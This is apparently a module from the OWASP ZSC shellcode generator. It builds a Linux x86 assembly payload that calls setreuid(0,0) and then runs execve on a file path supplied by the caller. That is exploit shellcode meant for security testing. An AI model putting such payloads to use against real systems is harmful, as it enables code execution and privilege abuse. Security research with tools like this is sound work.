#!/usr/bin/env python
'''
OWASP ZSC | ZCR Shellcoder
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/Ali-Razmjoo/OWASP-ZSC
http://api.z3r0d4y.com/
https://lists.owasp.org/mailman/listinfo/owasp-zsc-tool-project [ owasp-zsc-tool-project[at]lists[dot]owasp[dot]org ]
'''
from core import stack
from lib.opcoder.linux_x86 import convert
def exc(file_to_exec):
	return '''
mov    $0x46,%%al
xor    %%ebx,%%ebx
xor    %%ecx,%%ecx
int    $0x80
%s
mov    %%esp,%%ebx
xor    %%eax,%%eax
mov    $0xb,%%al
int    $0x80
mov    $0x1,%%al
mov    $0x1,%%bl
int    $0x80
'''%(file_to_exec)
def run(data):
	file_to_exec=data[0]
	return exc(stack.generate(file_to_exec,'%ebx','string'))